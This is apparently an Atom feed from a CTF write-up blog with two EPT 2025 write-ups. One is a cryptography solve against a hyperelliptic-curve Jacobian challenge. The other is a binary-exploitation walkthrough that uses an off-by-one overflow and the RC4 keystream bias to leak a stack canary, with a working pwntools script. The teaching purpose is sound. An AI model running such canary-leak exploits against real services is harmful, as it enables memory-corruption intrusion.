<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://zukane.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zukane.github.io/" rel="alternate" type="text/html" /><updated>2025-12-01T23:06:52+01:00</updated><id>https://zukane.github.io/feed.xml</id><title type="html">Zukane CTF</title><subtitle>Cryptography CTF Writeups</subtitle><author><name>Zukane</name></author><entry><title type="html">Hyperactive (EPT 2025)</title><link href="https://zukane.github.io/hyperactive/" rel="alternate" type="text/html" title="Hyperactive (EPT 2025)" /><published>2025-11-09T11:00:00+01:00</published><updated>2025-11-09T11:00:00+01:00</updated><id>https://zukane.github.io/hyperactive</id><content type="html" xml:base="https://zukane.github.io/hyperactive/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Now that you're an expert in elliptic curves, meet their hyperactive cousin!
</code></pre></div></div>

<p>In this CTF challenge, we are given the following encryption script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="mi">18446744073709551862</span>
<span class="n">α</span> <span class="o">=</span> <span class="mi">115792089237316201600239092629181903022853076627057745643635536179347243697936</span>
<span class="n">g</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">7</span>
<span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">**</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="p">(</span><span class="n">a</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="mh">0x1337deadbeef1337</span>

<span class="k">assert</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="k">assert</span> <span class="nb">pow</span><span class="p">(</span><span class="n">α</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="n">a</span>
<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">FiniteField</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>

<span class="n">H</span> <span class="o">=</span> <span class="n">HyperellipticCurve</span><span class="p">(</span><span class="n">α</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="n">n</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s">'u,v'</span><span class="p">)</span>
<span class="k">assert</span> <span class="n">H</span><span class="p">.</span><span class="n">genus</span><span class="p">()</span> <span class="o">==</span> <span class="n">g</span>
<span class="n">J</span> <span class="o">=</span> <span class="n">H</span><span class="p">.</span><span class="n">jacobian</span><span class="p">()</span>
<span class="n">J</span> <span class="o">=</span> <span class="n">J</span><span class="p">(</span><span class="n">J</span><span class="p">.</span><span class="n">base_ring</span><span class="p">())</span>

<span class="c1"># The flag has to be a valid point on the curve
</span><span class="n">P</span> <span class="o">=</span> <span class="n">H</span><span class="p">.</span><span class="n">lift_x</span><span class="p">(</span><span class="n">Integer</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s">"EPT{flag_for_testing}"</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)))</span>
<span class="n">encrypted</span> <span class="o">=</span> <span class="n">e</span> <span class="o">*</span> <span class="n">J</span><span class="p">(</span><span class="n">P</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">encrypted</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nb">list</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">encrypted</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nb">list</span><span class="p">())</span>
</code></pre></div></div>

<p>as well as the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[37591645601766195349914241190244587541126648045894370496224605285205051789795607044058331351759777461098164398507872, 31825584496706095821807938099201614630698246114642375148953595216939791581619471005478949323508227490535910661480600, 38070154357732543786398829210104835275871944922030673096683631338658551155399049387419283060209447466278551582717763, 1]
[21531145860198597476878989237755710606843064008828229889869373339271596611957323351613721272489730980549489312170394, 8261157019291686096998910330610725289103621846918848921362473394138486389948240100075107913867104846969233604431830, 12307880594487906245908563779709403748007966885981814022547160387211433226745858660170917861206356995209959276604903]
</code></pre></div></div>

<h5 id="source-code-analysis">Source code analysis</h5>

<p>The encryption script works on the Jacobian of a genus-3 hyperelliptic curve. It begins by defining some constants, and calculates prime $p$:</p>

\[\large p = \frac{a^{n}-1}{a-1}\]

<p>This is the same as the 7-th cyclotomic polynomial of $a$.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">7</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">x</span><span class="o">^</span><span class="mi">6</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">5</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">4</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">cyclotomic_polynomial</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">x</span><span class="o">^</span><span class="mi">6</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">5</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">4</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">1</span>
</code></pre></div></div>

<p>So, $p = \Phi_{7}(a)$. The script then builds the hyperelliptic curve $H: y^{2} + y = \alpha x^{7}$ over $\mathbb{F_p}$, and its Jacobian $J(\mathbb{F_p})$. The flag is encoded in the x-coordinate of point $P \in H(\mathbb{F_p})$ , and the flag is encrypted by scaling the divisor-class $J(P)$ by $e=0x1337deadbeef1337$ in the Jacobian group. We are given the pair $(u,v)$ as the ciphertext.</p>

<h5 id="recovering-the-order-of-the-jacobian-group">Recovering the order of the Jacobian Group</h5>

<p>Since the ciphertext is generated as $e \cdot J(P)$, we could recover $J(P)$ if we knew the order of the Jacobian group $\text{#}J(\mathbb{F}_{p})$ by calculating the modular inverse of $e$. Then, we would take one root of the decrypted $u(x)$ to get the original $x$. However, we do not know the order of the Jacobian group, and it is unfortunately not as simple as calling <code class="language-plaintext highlighter-rouge">.order()</code> in SageMath.</p>

<p>We have $p = \Phi_{7}(a)$, which splits in the cyclotomic field $K$:</p>

\[\large p = \prod^{6}_{k=1}(a-\zeta^{k})\]

<p>We pick a generator $\pi$, for example $a - \zeta$. The others are generated by the Galois automorphism $\sigma_{k} : \zeta \mapsto \zeta^{k}$. So $\sigma_{k}(\pi) = a-\zeta^{k}$.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">K</span><span class="p">.</span><span class="o">&lt;</span><span class="n">zeta</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">CyclotomicField</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">pi</span> <span class="o">=</span> <span class="n">K</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">-</span> <span class="n">zeta</span>
<span class="k">assert</span> <span class="n">norm</span><span class="p">(</span><span class="n">pi</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span>

<span class="k">def</span> <span class="nf">galois_embedding</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">K</span><span class="p">.</span><span class="n">hom</span><span class="p">([</span><span class="n">zeta</span><span class="o">^</span><span class="n">k</span><span class="p">])(</span><span class="n">x</span><span class="p">)</span>
</code></pre></div></div>

<p>Stickelberger’s theorem gives the prime-ideal factorization of the Jacobi sum $J(\chi^{r},\chi^{s}) \in \mathbb{Z}[\zeta_{7}]$ as:</p>

\[\large J(\chi^{r},\chi^{s}) = \prod^{6}_{i=1}\sigma_{i}(\pi)^{e_{i}}, \quad e_{i} = \left\lfloor \frac{(r+s)i}{7} \right\rfloor - \left\lfloor \frac{ri}{7} \right\rfloor  - \left\lfloor \frac{si}{7} \right\rfloor\]

<p>We use  $J(\chi,\chi)$, which gives :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">e</span> <span class="o">=</span> <span class="n">floor</span><span class="p">((</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span> <span class="o">-</span> <span class="n">floor</span><span class="p">((</span><span class="n">i</span><span class="p">)</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span> <span class="o">-</span> <span class="n">floor</span><span class="p">((</span><span class="n">i</span><span class="p">)</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"e</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> = </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    
<span class="c1">#e1 = 0
#e2 = 0
#e3 = 0
#e4 = 1
#e5 = 1
#e6 = 1
</span></code></pre></div></div>

<p>Hence, $J(\chi,\chi)$ is equal to $J_{1} = \sigma_{4}(\pi) \times \sigma_{5}(\pi) \times \sigma_{6}(\pi)$ up to a unit of $K$.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">J1</span> <span class="o">=</span> <span class="n">prod</span><span class="p">([</span><span class="n">galois_embedding</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">pi</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">]])</span>
</code></pre></div></div>

<p>Following this paper by Koblitz: https://www.cambridge.org/core/services/aop-cambridge-core/content/view/800A4343A2955C7D446B69063EB07BFC/S0008439500005786a.pdf, the order can be calculated as:</p>

\[\large \text{#}J(\mathbb{F}_{p}) = \prod^{2g}_{i=1}(1 - \alpha_{i}) = \lvert Norm_{K/\mathbb{Q}} (1 + J(\chi,\chi)) \rvert\]

<p>Since we only have $J(\chi,\chi)$ determined up to a 7th root of unity and sign, we can sweep the 14 candidates for the correct $\text{#}J(\mathbb{F}_{p})$</p>

\[\large \text{#}J(\mathbb{F}_{p}) = \lvert Norm_{K/\mathbb{Q}} (1 \pm \zeta^{k} \cdot J_{1})\rvert\]

<p>If the order is co-prime with $e$, we can invert the scalar and compute $C \cdot e^{-1} = J(P)$, then take the roots as mentioned before and get the original $x$.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">sgn</span> <span class="ow">in</span> <span class="p">(</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">N</span> <span class="o">=</span> <span class="n">ZZ</span><span class="p">(</span><span class="n">norm</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">sgn</span><span class="o">*</span><span class="p">(</span><span class="n">zeta</span><span class="o">^</span><span class="n">k</span><span class="p">)</span><span class="o">*</span><span class="n">J1</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">N</span><span class="o">*</span><span class="n">C</span> <span class="o">!=</span> <span class="n">J</span><span class="p">(</span><span class="mi">0</span><span class="p">):</span> 
            <span class="k">continue</span>
        <span class="n">JP</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span> <span class="o">*</span> <span class="n">C</span>
        <span class="k">for</span> <span class="n">a_root</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">JP</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">roots</span><span class="p">():</span>
            <span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">ZZ</span><span class="p">(</span><span class="n">a_root</span><span class="p">)).</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p>This finally gives us the flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EPT{Now_you_can_count_cyclotomically_f045e0f0cd}
</code></pre></div></div>

<h5 id="solvesage">solve.sage</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>

<span class="n">a</span> <span class="o">=</span> <span class="mi">18446744073709551862</span>
<span class="n">alpha</span> <span class="o">=</span> <span class="mi">115792089237316201600239092629181903022853076627057745643635536179347243697936</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">7</span>
<span class="n">e</span> <span class="o">=</span> <span class="mh">0x1337deadbeef1337</span>
<span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">^</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="p">(</span><span class="n">a</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">F</span> <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> 
<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">F</span><span class="p">[]</span>
<span class="n">H</span> <span class="o">=</span> <span class="n">HyperellipticCurve</span><span class="p">(</span><span class="n">alpha</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">J</span> <span class="o">=</span> <span class="n">H</span><span class="p">.</span><span class="n">jacobian</span><span class="p">()(</span><span class="n">F</span><span class="p">)</span>

<span class="n">v</span> <span class="o">=</span> <span class="n">R</span><span class="p">([</span><span class="mi">21531145860198597476878989237755710606843064008828229889869373339271596611957323351613721272489730980549489312170394</span><span class="p">,</span> <span class="mi">8261157019291686096998910330610725289103621846918848921362473394138486389948240100075107913867104846969233604431830</span><span class="p">,</span> <span class="mi">12307880594487906245908563779709403748007966885981814022547160387211433226745858660170917861206356995209959276604903</span><span class="p">])</span>
<span class="n">u</span> <span class="o">=</span> <span class="n">R</span><span class="p">([</span><span class="mi">37591645601766195349914241190244587541126648045894370496224605285205051789795607044058331351759777461098164398507872</span><span class="p">,</span> <span class="mi">31825584496706095821807938099201614630698246114642375148953595216939791581619471005478949323508227490535910661480600</span><span class="p">,</span> <span class="mi">38070154357732543786398829210104835275871944922030673096683631338658551155399049387419283060209447466278551582717763</span><span class="p">,</span> <span class="mi">1</span><span class="p">])</span>
<span class="n">C</span> <span class="o">=</span> <span class="n">J</span><span class="p">([</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">])</span>

<span class="n">K</span><span class="p">.</span><span class="o">&lt;</span><span class="n">zeta</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">CyclotomicField</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">pi</span> <span class="o">=</span> <span class="n">K</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">-</span> <span class="n">zeta</span>
<span class="k">assert</span> <span class="n">norm</span><span class="p">(</span><span class="n">pi</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span>

<span class="k">def</span> <span class="nf">galois_embedding</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">K</span><span class="p">.</span><span class="n">hom</span><span class="p">([</span><span class="n">zeta</span><span class="o">^</span><span class="n">k</span><span class="p">])(</span><span class="n">x</span><span class="p">)</span>

<span class="n">J1</span> <span class="o">=</span> <span class="n">prod</span><span class="p">([</span><span class="n">galois_embedding</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">pi</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">]])</span>

<span class="k">for</span> <span class="n">sgn</span> <span class="ow">in</span> <span class="p">(</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">N</span> <span class="o">=</span> <span class="n">ZZ</span><span class="p">(</span><span class="n">norm</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">sgn</span><span class="o">*</span><span class="p">(</span><span class="n">zeta</span><span class="o">^</span><span class="n">k</span><span class="p">)</span><span class="o">*</span><span class="n">J1</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">N</span><span class="o">*</span><span class="n">C</span> <span class="o">!=</span> <span class="n">J</span><span class="p">(</span><span class="mi">0</span><span class="p">):</span> 
            <span class="k">continue</span>
        <span class="n">JP</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span> <span class="o">*</span> <span class="n">C</span>
        <span class="k">for</span> <span class="n">a_root</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">JP</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">roots</span><span class="p">():</span>
            <span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">ZZ</span><span class="p">(</span><span class="n">a_root</span><span class="p">)).</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="Hyperellipic Curve" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">Encryptor (EPT 2025)</title><link href="https://zukane.github.io/encryptor/" rel="alternate" type="text/html" title="Encryptor (EPT 2025)" /><published>2025-11-08T11:00:00+01:00</published><updated>2025-11-08T11:00:00+01:00</updated><id>https://zukane.github.io/encryptor</id><content type="html" xml:base="https://zukane.github.io/encryptor/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Grab your resident cryptographer and try our shiny new "Encryption-As-A-Service"!

ncat --ssl encryptor-pwn.ept.gg 1337
</code></pre></div></div>

<p>In this CTF challenge we are given a binary named <code class="language-plaintext highlighter-rouge">encryptor</code> which presents us with an encryption service:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the EPT encryptor!
Please behave yourself, and remember to stay away from a certain function at 0x55667a4c54f0!
1. Encrypt a message
2. Reset the key and encrypt again
3. Change offset
4. Exit
&gt;
</code></pre></div></div>

<p>Inspecting the binary’s security mechanisms, we can see everything is enabled:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre></div></div>

<p>Though, the program does leak the address to the <code class="language-plaintext highlighter-rouge">win()</code> function.</p>

<h5 id="reverse-engineering">Reverse engineering</h5>

<p>By picking choice 1 in the menu, we can encrypt a message of our choice:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">menu_choice</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter string to encrypt</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">local_108</span><span class="p">,</span><span class="mi">242</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
    <span class="n">RC4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">local_108</span> <span class="o">+</span> <span class="n">local_18</span><span class="p">,</span><span class="n">local_1f8</span><span class="p">,</span><span class="n">local_108</span> <span class="o">+</span> <span class="n">local_18</span><span class="p">);</span>
    <span class="n">puts_hex</span><span class="p">(</span><span class="n">local_1f8</span><span class="p">);</span>
    <span class="n">resetKey</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The program uses <code class="language-plaintext highlighter-rouge">fgets()</code> to read 242 bytes of user input. The input is encrypted with RC4, the ciphertext is printed, before the encryption key is reset.  Notably, the program reads 242 bytes (241 bytes + null terminator) when the buffer is only 240 bytes:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uchar</span> <span class="n">local_1f8</span> <span class="p">[</span><span class="mi">240</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">local_108</span> <span class="p">[</span><span class="mi">240</span><span class="p">];</span>
</code></pre></div></div>

<p>This allows us to overwrite one byte after our input buffer. The byte located here is the offset <code class="language-plaintext highlighter-rouge">local_18</code> which is used by the <code class="language-plaintext highlighter-rouge">RC4()</code> function to determine the start-offset for RC4’s input. The feature to control this offset value via menu option 3 <code class="language-plaintext highlighter-rouge">Change offset</code> is disabled:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; 3
Sorry, offset function disabled due to abuse!
</code></pre></div></div>

<p>The ability to control the offset value will prove to be useful, as we can use it to encrypt the stack canary, which is located 248 bytes after our input buffer:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>240-byte input buffer
8-byte offset (or 1 byte + 7 unused bytes)
8-byte stack canary
8-byte saved rbp
8-byte return address (rip)
</code></pre></div></div>

<h5 id="rc4-one-byte-bias">RC4 one-byte bias</h5>

<p>With an ability to encrypt the stack canary, the focus shifts towards cryptographic attacks. RC4 is an stream-cipher which isn’t really used anymore, primarily because the keystream generated by RC4 is biased, making it vulnerable to “distinguishing attacks”. According to <a href="https://en.wikipedia.org/wiki/RC4#Biased_outputs_of_the_RC4">Wikipedia</a>, <code class="language-plaintext highlighter-rouge">the second output byte of the cipher was biased toward zero with probability 1/128 (instead of 1/256).</code></p>

<p>Since the ciphertext is generated by XORing the plaintext and keystream:</p>

\[\large C = P \oplus K\]

<p>And the 2nd keystream byte is <code class="language-plaintext highlighter-rouge">\x00</code> 1/128 of the time (instead of 1/256 like other bytes), the most frequent ciphertext byte from many samples will be the exact plaintext byte with high likelihood.</p>

<p>We can use this one-byte bias along with our control of the offset to line up the canary bytes with the 2nd byte of the keystream, collect many samples, and check the most frequently appearing byte to determine the stack canary byte at that index. By adjusting the offset for each canary byte, we are able to leak the full stack canary.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./encryptor"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"at "</span><span class="p">)</span>
<span class="n">win</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Win:"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">win</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">reset_key</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">240</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="mh">0xF7</span> <span class="o">+</span> <span class="n">i</span><span class="p">)))</span>
    <span class="n">cnt</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6000</span><span class="p">):</span>
        <span class="n">ct_line</span> <span class="o">=</span> <span class="n">reset_key</span><span class="p">()</span>
        <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ct_line</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
        <span class="n">cnt</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Recovered canary byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>

<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary = 0x</span><span class="si">{</span><span class="n">canary</span><span class="p">[</span><span class="si">::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p><em>Note, we do not need to leak the first canary byte, as it is always <code class="language-plaintext highlighter-rouge">\x00</code></em></p>

<p><em>Note 2, with 6000 samples, the correct byte is not always found due to statistics. Number of samples can be adjusted, but will take longer</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Win: 0x5cd7721b24f0
Recovered canary byte: 0x33
Recovered canary byte: 0x4d
Recovered canary byte: 0xda
Recovered canary byte: 0x28
Recovered canary byte: 0xb0
Recovered canary byte: 0x4f
Recovered canary byte: 0xd
canary = 0x0d4fb028da4d3300
